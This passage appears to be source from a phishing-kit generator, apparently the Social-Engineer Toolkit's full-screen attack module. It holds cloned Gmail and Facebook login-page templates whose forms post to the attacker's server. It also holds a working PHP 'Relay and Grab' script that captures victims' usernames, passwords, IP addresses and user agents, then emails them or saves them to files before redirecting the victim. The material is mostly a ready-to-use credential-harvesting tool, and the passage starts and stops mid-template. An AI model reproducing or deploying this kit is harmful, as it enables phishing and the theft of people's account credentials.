  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb {
  background-color: rgba(0,0,0,.2);
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  min-height: 28px;
  padding: 100px 0 0;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 7px 0 0;
  padding: 0 0 0 100px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:hover {
  background-color: rgba(0,0,0,.4);
  -webkit-box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:active {
  background-color: rgba(0,0,0,0.5);
  -webkit-box-shadow: inset 1px 1px 3px rgba(0,0,0,0.35);
  box-shadow: inset 1px 1px 3px rgba(0,0,0,0.35);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb {
  background-color: rgba(255,255,255,.3);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:hover {
  background-color: rgba(255,255,255,.6);
  -webkit-box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:active {
  background-color: rgba(255,255,255,.75);
  -webkit-box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track:horizontal {
  border-width: 6px 0 1px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.035);
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.07);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-thumb {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 6px 0 1px;
  }
  .jfk-scrollbar::-webkit-scrollbar-corner {
  background: transparent;
  }
  body.jfk-scrollbar::-webkit-scrollbar-track-piece {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 0 0 0 3px;
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body.jfk-scrollbar::-webkit-scrollbar-track-piece:horizontal {
  border-width: 3px 0 0;
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body.jfk-scrollbar::-webkit-scrollbar-thumb {
  border-width: 1px 1px 1px 5px;
  }
  body.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 5px 1px 1px;
  }
  body.jfk-scrollbar::-webkit-scrollbar-corner {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 3px 0 0 3px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  }
  .errormsg {
  margin: .5em 0 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
</style>
<style type="text/css">
  .main {
  width: auto;
  max-width: 1000px;
  min-width: 780px;
  }
  .product-info {
  margin: 0 385px 0 0;
  }
  .product-info h3 {
  font-size: 1.23em;
  font-weight: normal;
  }
  .product-info a:visited {
  color: #61c;
  }
  .product-info .g-button:visited {
  color: #666;
  }
  .sign-in {
  width: 335px;
  float: right;
  }
  .signin-box,
  .accountchooser-box {
  margin: 12px 0 0;
  padding: 20px 25px 15px;
  background: #f1f1f1;
  border: 1px solid #e5e5e5;
  }
  .product-headers {
  margin: 0 0 1.5em;
  }
  .product-headers h1 {
  font-size: 25px;
  margin: 0 !important;
  }
  .product-headers h2 {
  font-size: 16px;
  margin: .4em 0 0;
  }
  .features {
  overflow: hidden;
  margin: 2em 0 0;
  }
  .features li {
  margin: 3px 0 2em;
  }
  .features img {
  float: left;
  margin: -3px 0 0;
  }
  .features p {
  margin: 0 0 0 68px;
  }
  .features .title {
  font-size: 16px;
  margin-bottom: .3em;
  }
  .features.no-icon p {
  margin: 0;
  }
  .features .small-title {
  font-size: 1em;
  font-weight: bold;
  }
  .notification-bar {
  background: #f9edbe;
  padding: 8px;
  }
</style>
<style type="text/css">
  .signin-box h2 {
  font-size: 16px;
  line-height: 17px;
  height: 16px;
  margin: 0 0 1.2em;
  position: relative;
  }
  .signin-box h2 strong {
  display: inline-block;
  position: absolute;
  right: 0;
  top: 1px;
  height: 19px;
  width: 52px;
  background: transparent url(http://ssl.gstatic.com/accounts/ui/google-signin-flat.png) no-repeat;
  }
  @media only screen and (-webkit-device-pixel-ratio: 2){
  .signin-box h2 strong {
  background: transparent url(http://ssl.gstatic.com/accounts/ui/google-signin-flat_2x.png) no-repeat;
  background-size: 52px 19px;
  }
  }
  .signin-box div {
  margin: 0 0 1.5em;
  }
  .signin-box label {
  display: block;
  }
  .signin-box input[type=email],
  .signin-box input[type=text],
  .signin-box input[type=password] {
  width: 100%;
  height: 32px;
  font-size: 15px;
  direction: ltr;
  }
  .signin-box .email-label,
  .signin-box .passwd-label {
  font-weight: bold;
  margin: 0 0 .5em;
  display: block;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  }
  .signin-box .reauth {
  display: inline-block;
  font-size: 15px;
  height: 29px;
  line-height: 29px;
  margin: 0;
  }
  .signin-box label.remember {
  display: inline-block;
  vertical-align: top;
  margin: 9px 0 0;
  }
  .signin-box .remember-label {
  font-weight: normal;
  color: #666;
  line-height: 0;
  padding: 0 0 0 .4em;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  }
  .signin-box input[type=submit] {
  margin: 0 1.5em 1.2em 0;
  height: 32px;
  font-size: 13px;
  }
  .signin-box ul {
  margin: 0;
  }
  .signin-box .training-msg {
  padding: .5em 8px;
  background: #f9edbe;
  }
  .signin-box .training-msg p {
  margin: 0 0 .5em;
  }
</style>
<link rel="publisher" href="https://plus.google.com/103345707817934461425">
<style type="text/css">
  .mail .mail-promo {
  border: 1px solid #ebebeb;
  margin: 30px 0 0;
  padding: 20px;
  overflow: hidden;
  }
  .mail-promo-64 h4 {
  padding-top: 12px;
  }
  .mail .mail-promo h3,
  .mail .mail-promo p {
  margin-left: 60px;
  }
  .mail .mail-promo img {
  width: 42px;
  margin: 3px 0 0;
  float: left;
  }
  .mail .mail-promo h3 {
  font-size: 16px;
  margin-bottom: .3em;
  }
  .mail .mail-promo p {
  margin-bottom: 0;
  }
  .mail .mail-promo p:last-of-type {
  margin-bottom: 0;
  }
  .mail .mail-promo a {
  white-space: nowrap;
  }
  .mail .mail-promo-64 {
  padding: 5px 18px 5px 10px;
  }
  .mail .mail-promo-64 img {
  width: 64px;
  height: 64px;
  }
  .mail .mail-promo-64 h3,
  .mail .mail-promo-64 p {
  margin-left: 76px;
  }
  .mail .mail-promo-64 h3 {
  padding-top: .6em;
  }
  .mail h3.mail-hero-heading {
  font-family: 'open sans', arial, sans-serif;
  font-size: 24px;
  font-weight: 300;
  }
  .mail h4.mail-hero-heading {
  color: #565656;
  font-size: 15px;
  font-weight: normal;
  line-height: 22px;
  margin-top: 15px;
  width: 270px;
  }
  .mail h5.mail-about-heading {
  color: #565656;
  font-size: 15px;
  font-weight: bold;
  }
  .mail ul.mail-links {
  margin: 0;
  overflow: hidden;
  }
  .mail ul.mail-links li {
  display: inline-block;
  margin-right: 20px;
  *display: inline; /*ie7*/
  }
  .mail .mail-hero {
  background-image:url("http://ssl.gstatic.com/accounts/services/mail/gradient.png");
  background-repeat: no-repeat;
  background-position: 0 137px;
  height: 317px;
  margin-top: -20px;
  width: 100%;
  }
  .mail .mail-hero-left {
  display: block;
  float: left;
  width: 55%;
  }
  .mail .mail-hero-right {
  float: left;
  width: 45%;
  }
  .mail .mail-about-section {
  padding-top: 60px;
  width: 100%;
  }
  .mail .mail-about-col-left {
  display: block;
  float: left;
  width: 55%;
  }
  .mail .mail-about-col-right {
  display: block;
  float: left;
  width: 45%;
  }
  .mail .mail-about-col-space {
  display: block;
  float: left;
  width: 40px;
  }
  .mail .mail-buttons {
  vertical-align: top;
  margin-top: 90px;
  width: 300px;
  }
  .mail .mail-button-google-play {
  margin-bottom: 1px;
  }
  .mail .mail-button-unit {
  display: inline-block;
  padding-right: 10px;
  float: left;
  }
  .mail .mail-hero-img {
  padding-left: 70px;
  }
  .mail p.mail-about-text,
  .mail p.mail-account-text {
  color: #575757;
  line-height: 20px;
  }
  .mail p.mail-about-text {
  width: 80%;
  }
@media only screen and (max-width: 1100px) {
  .mail h5.mail-about-heading {
  font-size: 13px;
  width: 80%;
  }
}
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar">
  <div class="header content clearfix">
  <img class="logo" src="http://ssl.gstatic.com/images/logos/google_logo_41.png" alt="Google">
  <span class="signup-button">
  New to Gmail?
  <a id="link-signup" class="g-button g-button-red" href="https://accounts.google.com/SignUp?service=mail&continue=http%3A%2F%2Fmail.google.com%2Fmail%2F&ltmpl=default">
  Create an account
  </a>
  </span>
  </div>
  </div>
  <div class="main content clearfix">
  <div class="sign-in">
<div class="signin-box">
  <h2>Sign in <strong></strong></h2>
  <form novalidate id="gaia_loginform" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
  <input type="hidden" 
  
    
  name="continue" id="continue" value="http://mail.google.com/mail/"

  
 >
  <input type="hidden" 
  
    
  name="service" id="service" value="mail"

  
 >
  <input type="hidden" 
  
    
  name="rm" id="rm" value="false"

  
 >
  <input type="hidden" 
  
    
  name="dsh" id="dsh" value="1669574552691490000"

  
 >
  <input type="hidden" 
  
    
  name="ltmpl" id="ltmpl" value="default"

  
 >
  <input type="hidden" 
  
    
  name="scc" id="scc" value="1"

  
 >
  <input type="hidden"
         name="GALX"
         value="t4YOO_8rpa4">
  <input type="hidden"
    id="pstMsg"
    name="pstMsg"
    value="0">
  <input type="hidden"
    id="dnConn"
    name="dnConn"
    value="">
  <input type="hidden"
    id="checkConnection"
    name="checkConnection"
    value="">
  <input type="hidden"
    id="checkedDomains"
    name="checkedDomains"
    value="youtube">
<input type="hidden" name="timeStmp" id="timeStmp"
       value=''/>
<input type="hidden" name="secTok" id="secTok"
       value=''/>
<input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
<div class="email-div">
  <label for="Email"><strong class="email-label">Username</strong></label>
  <input type="email" spellcheck="false"  

  name="Username" id="Email" value=""

  

      
    >
</div>
<div class="passwd-div">
  <label for="Passwd"><strong class="passwd-label">Password</strong></label>
  <input type="password" name="Password" id="Passwd"
    
    
    
  >
</div>
  <input type="submit" class="g-button g-button-submit" name="Submit" id="signIn"
      value="Sign in">
  <label class="remember" onclick="">
  <input type="checkbox" 
  name="PersistentCookie" id="PersistentCookie" value="yes"

    checked="checked"
  >
  <strong class="remember-label">
  Stay signed in
  </strong>
  </label>
  <input type="hidden" name="rmShown" value="1">
  </form>
  <ul>
  <li>
  <a id="link-forgot-passwd"
          href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=http%3A%2F%2Fmail.google.com%2Fmail%2F"
          target="_top">
  Can&#39;t access your account?
  </a>
  </li>
  </ul>
</div>
  </div>
  <div class="product-info mail">
<div class="product-headers">
  <h1 class="redtext">Gmail</h1>
</div>
<div class="mail-hero">
  <div class="mail-hero-left">
  <h4 class="mail-hero-heading">Experience the ease and simplicity of Gmail, everywhere you go.</h4>
  <div class="mail-buttons">
  <div class="mail-button-unit">
  <a href="https://mail.google.com/mail/help/redirect/index.html?r=android&hl=en">
  <img src="http://ssl.gstatic.com/accounts/services/mail/buttons/google_play_en.png" class="mail-button-google-play">
  </a>
  </div>
  <div class="mail-button-unit">
  <a href="https://mail.google.com/mail/help/redirect/index.html?r=apple&hl=en">
  <img src="http://ssl.gstatic.com/accounts/services/mail/buttons/apple_store_en.png">
  </a>
  </div>
  </div>
  </div>
  <div class="mail-hero-right">
  <img src="http://ssl.gstatic.com/accounts/services/mail/phone.png" class="mail-hero-img">
  </div>
</div>
<div class="mail-about-section">
  <div class="mail-about-col-left">
  <h5 class="mail-about-heading">About Gmail - email from Google</h5>
  <p class="mail-about-text">Video chat with a friend, or give someone a ring all from your inbox.
  See more reasons to
  <a href="https://mail.google.com/mail/help/intl/en/whygmail.html"
    onclick="_gaq.push(['_link', 'https://mail.google.com/mail/help/intl/en/whygmail.html', 'true']); return false;">
  switch</a> or check out our
  <a href="http://mail.google.com/mail/help/intl/en-US/features.html"
      onclick="_gaq.push(['_link', 'http://mail.google.com/mail/help/intl/en-US/features.html', 'true']); return false;">
  newest features</a>.
  </div>
  <div class="mail-about-col-space"></div>
  <div class="mail-about-col-right">
  <h5 class="mail-about-heading">Bring Gmail to work with Google Apps</h5>
  <p class="mail-account-text">Get the Gmail you love with custom email, calendar, video meetings & more for your business. <a href="http://www.google.com/enterprise/apps/business/campaign/personal_gmail.html?utm_source=gmail_promo&utm_medium=et&utm_campaign=WW--2012q3--ww_apps_smb_et_2012-gmailloginpage:70160000000jf0oaag&utm_content=en_US">Learn more</a></p>
  </div>
</div>
  </div>
  <div id="cc_iframe_parent"></div>
  </div>
<div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul>
  <li> 2013 Google</li>
  <li><a href="http://www.google.com/apps/intl/en/business/gmail.html#utm_medium=et&utm_source=gmail-signin-en&utm_campaign=crossnav" target="_blank">Gmail for Work</a></li>
  <li><a href="http://mail.google.com/mail/help/intl/en/terms.html" target="_blank">Terms &amp; Privacy</a></li>
  <li><a href="http://mail.google.com/support/?hl=en" target="_blank">Help</a></li>
  </ul>
  <span id="lang-chooser-wrap" class="lang-chooser-wrap" style="display: none;">
  <img src="http://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png">
  <select id="lang-chooser" class="lang-chooser">
  </option>
  </select>
  </span>
  </div>
</div>
  </div>
  </body>
</html>
</div>        
        <script src=\""""+pathList[3]+"""\"></script> 
        <script src=\""""+pathList[4]+"""\"></script>
        <script src=\""""+pathList[5]+"""\"></script>
        <script src=\""""+pathList[6]+"""\"></script>
        <script src=\""""+pathList[7]+"""\"></script>

</body>
</html>

<?PHP
// FullScreen Attack PHP Relay and Grab Code
// Written By: d4rk0
// Twitter: @d4rk0s


function writeFile($fileName,$data,$fileType){
    // This Opens file at end for writing if doesnt exist tries to create it
    $file = fopen($fileName, 'a');
    fwrite($file, $data);
    fclose($file);
  }


function sendM($to,$message){
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Additional headers
        $headers .= 'From: SET Attack <fullscreen@phish.org>' . "\\r\\n";
        $subject = "Victims Information";
        // Mail it
        mail($to, $subject, $message, $headers);
 }

function pageForward($page){
        // Page Forward
        echo '<meta http-equiv="refresh" content="0;URL='.$page.'">';
 }

function randomFilename(){
     // return random file name
    mt_srand(time()%2147 * 1000000 + (double)microtime() * 1000000); 
    $randomNUM = mt_rand(1, 972484); 
    $fileNAME = "report" . $randomNUM. ".txt";
    return $fileNAME;
 }


function pullIP(){
    // This Returns an IP of person
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
 }

function userAgent(){
    $Agent = $_SERVER['HTTP_USER_AGENT'];
    return $Agent;
 }


if(isset($_POST['submit'])){

       $action  = \""""+valueList[0]+"""\";
       $redirect = \""""+valueList[1]+"""\";
       $verbose = \""""+valueList[2]+"""\";
       $fileName = \""""+valueList[3]+"""\";
       $to = \""""+valueList[3]+"""\";
       // Grab Form Values
       $email = $_POST[\"Username\"];
       $password =  $_POST[\"Password\"];
   
    // Specify rest of PHP code
       
    // Verbose loud
    if ($verbose == "loud"){
        $IP = pullIP();
        $Agent = userAgent();
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- Other Information: ".
        "\n Victim IP: " .$IP. " UserAgent: ".$Agent;
        }

   // Verbose quiet
   if ($verbose == "quiet"){
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- END OF TRANSCRIPT";
        }


    // Send in mail
    if ($action == "mail"){
       // Email Message 
        sendM($to,$message);
        pageForward($redirect);
    }
  

    // Save to ServerDisk as Same File
    if ($action == "diskFile"){
        // Write to Individual File 
        if ($fileName == ""){ $fileName = "SETInfo.txt";  }
        writeFile($fileName,$message);
        pageForward($redirect);
    }


    // Save to ServerDisk Random File
    if ($action == "diskRandom"){
        // Get random File name
        $fileName = randomFilename();          
        writeFile($fileName,$message);
        pageForward($redirect);
    }

 }

?>
            """
            # Append Code to list
            indexList.append(indexCode) 
            # Append Index List
            return indexList  


        # Facebook HTML For FullScreeen
        if codeType == "FB":
            indexList = []
            indexCode = """<!doctype html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>"""+title+"""</title>
<meta name="description" content="">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
  
   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>


<div id="spoofHeader">
<div id="spoofMenu"></div>
<div id="spoofBrowser"></div>
</div>


<div id="spoofSite">

<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">
<head><meta charset="utf-8" /><meta name="robots" content="noodp, noydir" /><meta name="referrer" content="default" id="meta_referrer" /><meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." /><link rel="alternate" media="handheld" href="https://www.facebook.com/login.php" /><title id="pageTitle">Facebook</title><meta property="og:site_name" content="Facebook" /><meta property="og:url" content="https://www.facebook.com/login.php" /><meta property="og:locale" content="en_US" /><link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/login.php" /><link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/login.php" /><link rel="alternate" hreflang="id" href="https://id-id.facebook.com/login.php" /><link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/login.php" /><link rel="alternate" hreflang="es" href="https://es-la.facebook.com/login.php" /><link rel="alternate" hreflang="th" href="https://th-th.facebook.com/login.php" /><link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/login.php" /><link rel="alternate" hreflang="it" href="https://it-it.facebook.com/login.php" /><link rel="alternate" hreflang="en" href="https://www.facebook.com/login.php" /><link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" /><noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript>
    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/ys/r/DK3seKaYZKC.css" />
    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yM/r/Xu2jHbxGWaO.css" />
    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yw/r/d2yi244yqfK.css" />
  </head><body class="login_page fbx UIPage_LoggedOut gecko Locale_en_US"><div class="_li"><div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarHolder"><div id="blueBar"><div><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><a class="lfloat" href="/" title="Go to Facebook Home"><i class="fb_logo img sp_459faa sx_955643"><u>Facebook logo</u></i></a></div></div><div class="signupBanner"><div class="signup_bar_container"><div class="signup_box clearfix"><span class="signup_box_content"><a class="_42ft _42fu signup_btn selected _42gz _42gy" role="button" href="/r.php?locale=en_US">Sign Up</a></span></div></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat"><h2 class="accessible_elem">Facebook Login</h2><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true">Facebook Login</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_container"><form id="login_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post"><input type="hidden" name="lsd" value="AVpNsm0y" autocomplete="off" /><div class="hidden_elem"></div><div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value="" /><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" /><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1" /><input type="hidden" autocomplete="off" id="next" name="next" value="" /><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" /><input type="hidden" name="lgnrnd" value="223259_LlDE" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="form_row clearfix"><label for="email" class="login_form_label">Email or Phone:</label><input type="text" class="inputtext" id="email" name="Username" value="" /></div><div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="Password" id="pass" class="inputpassword" /></div><div class="persistent"><div class="uiInputLabel clearfix"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelCheckbox" /><label for="persist_box">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="submit" type="submit" id="u_0_1" /></label></div><div id="register_link">or <strong><a href="/r.php?next&amp;locale=en_US&amp;display=page" target="_self" rel="nofollow" id="reg_btn_link" tabindex="-1">Sign up for Facebook</a></strong></div></div><p class="reset_password form_row"><a href="https://www.facebook.com/recover/initiate" target="" tabindex="-1">Forgot your password?</a></p></div></form></div></div></div><ul class="uiList ptm localeSelectorList _509- _4ki _6-h _6-j _6-i"><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;en_US&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="English (US)">English (US)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;es_LA&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Spanish">Espaol</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;pt_BR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Portuguese (Brazil)">Portugus (Brasil)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;fr_FR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="French (France)">Franais (France)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;de_DE&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="German">Deutsch</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;it_IT&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Italian">Italiano</a></li><li><a dir="rtl" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;ar_AR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Arabic"></a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;hi_IN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Hindi"></a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;zh_CN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Simplified Chinese (China)">()</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;ja_JP&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Japanese"></a></li><li><a class="showMore" rel="dialog" href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php&amp;source=TOP_LOCALES_DIALOG" title="Show more languages" role="button"></a></li></ul></div></div><div id="pageFooter" data-referrer="page_footer"><div id="contentCurve"></div><div role="contentinfo" aria-label="Facebook site links"><table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0"><tbody><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/mobile/?ref=pf" title="Check out Facebook Mobile.">Mobile</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/find-friends?ref=pf" title="Find anyone on the web.">Find Friends</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/badges/?ref=pf" title="Embed a Facebook badge on your website.">Badges</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/people/" title="Browse our people directory.">People</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/pages/" title="Browse our pages directory.">Pages</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/places/" title="Browse our places directory.">Places</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/?ref=pf" title="Check out Facebook App Center.">Apps</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/category/games/?ref=pf" title="Check out Facebook games.">Games</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/appcenter/category/music/?ref=pf" title="Check out Facebook music apps.">Music</a></td></tr><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/facebook" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Advertise on Facebook.">Create Ad</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/pages/create/?ref_type=sitefooter" title="Create a Page">Create Page</a></td><td class="_51m- hLeft plm"><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/privacy/explanation" title="Learn about your privacy and Facebook.">Privacy</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/help/cookies/?ref=sitefooter" title="Learn about cookies and Facebook.">Cookies</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/policies/?ref=pf" 